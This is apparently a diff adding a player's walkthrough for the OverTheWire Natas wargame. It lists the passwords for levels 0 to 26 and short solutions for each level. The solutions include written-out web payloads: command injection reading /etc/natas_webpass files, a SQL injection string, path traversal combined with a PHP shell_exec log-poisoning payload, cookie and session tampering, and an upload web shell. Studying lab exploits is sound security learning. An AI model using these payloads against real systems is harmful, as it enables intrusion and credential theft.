@@ -1,0 +1,115 @@
+NatasX.labs.natas.overthewire.org
+(X) stands for level 
+NOTE: This level was using WebUI, not SSH anymore. So, open it with your favourite browser
+
+natas0: natas0
+see it trough view-source:(website)
+
+natas1: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
+same method as natas0
+
+natas2: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
+this one using Dir exploit vulnerabilities trough /files/user.txt
+
+natas3: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
+guidance filename is robot.txt, then u will be guided to the /s3cr3t/ directory that contains the credentials
+to the next level
+
+natas4: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+use burpsuite, go to proxy>intercept then enable the intercept to change the request
+and change the referrer to natas 5 then refresh (i hate this level)
+
+natas5: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+change the value cookie LoggedIn=0 to 1
+
+natas6: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
+goto "view source code" then copy the includes/secret.inc, paste the thing to replace the index address
+then after opening the secret you will get the actual secret, the secret is= FOEIUWGHFEEUHOFUOIU 
+
+natas7: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+
+natas8: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+we gonna use: gchq.github.io/CyberChef/
+first of all, we gotta decode it FROM hex > reverse > base64
+(lastPwd: oubWYf2kBq)
+
+natas9: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+http://natas9.natas.labs.overthewire.org/?needle=;cat%20/etc/natas_webpass/natas10
+so basically, the semicolon (;) has successfully triggered the level to force access to the shell command
+cause also, the input is unsanitized 
+
+natas10: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+http://natas10.natas.labs.overthewire.org/?needle=%0Acat%20/etc/natas_webpass/natas11
+cause the input was sanitized, we cant use the semicolon vulnerabilities anymore.
+To do so, i'm using some certain of "universal cheat code" things
+
+natas11: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+(open the natas11.txt for guidance)
+
+natas12: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
+upload SCnatas12.php to the shell, open it, and try to obtain shell access by 
+<RandomStr>.php?e=cat /etc/natas_webpass/natas13.
+If file doesnt shown as .php, then change it urself via burpsuite
+(script will be provided later)
+
+natas13: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+method was kinda similar to the prev level, but here is the upgraded version.
+So, u can upload the script and do the same. But, make sure to check the file first,
+cause u have to delete the dumpText thats used to trick the system.
+
+natas14: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+the password is= (" or 1=1 --) without ()
+input the parameters above as password and username
+
+natas15: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+for this level we got no vulnerabilities found, theres only true or false value thats given by the level 
+by giving the "natas16" user as true, so we got a bruteforce script (provided at repo)
+
+natas16: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+(I surrender guys, i had to use the bruteforce)
+
+natas17: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+same as Natas15, but we didnt get the result if the user is true or false.
+so, we gotta reverse engineering into it, by taking advantage of time dilation sleep()
+
+natas18: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
+we gonna login as admin, but actually just change the the PHPSESSID to 119, via DevTools / F12
+or alternatively, you can use my script
+after that u can add "/index.php?debug" to the url
+
+natas19: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
+same method as before, but the PHPSESSID is harder to obtain, cause it is now encrypted.
+dont worry, the script is also provided. The new PHPSESSID=3238312d61646d696e
+
+natas20: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
+for this level you need burpsuite, go trough proxy> intercept> turn it on, and open browser
+input any username, then edit the request by right clicking and edit the user=test%0aadmin%201
+before continue pls right click and add to repeater
+then, edit the url and add ?debug to the end of it.
+it mostly doesnt work at the first try, so just try until you succeed:D
+
+natas21: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
+first of all, open both of natas21 and experimenter at burpsuite, the credentials are the same
+burpsuite as usual, go to the experimenter website, edit the string between yellow"HERE"&submit=update
+add &admin=1 there, dont forget the ?debug, and copy the PHPSESSID, paste it to the natas21 DevTools
+
+natas22: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
+at burpsuite, add "/index.php?twilio" to the url, and before the page reload for the 2nd time, find the
+code 302 at HTTP history, open it, then see on response. Your password will be there
+
+natas23: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
+pass for this one is: 100iloveyou
+
+natas24: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
+add [] to revert the password to NULL, like this:
+"?passwd[]=(you can put anything here)"
+
+natas25: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
+http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_0e3c98mfekmb44k7v956rarobu.log
+"0e3c98mfekmb44k7v956rarobu" are my session id, replace it with yours (F12 > apps > cookie)
+then do intercept, replace the "User-agent:" with= " <?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?> "
+after that, take a look at HTTP history, and the request you edited and see the response tab.
+if you see a random string apeeared there, thats ur password for the next level
+
+natas26: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
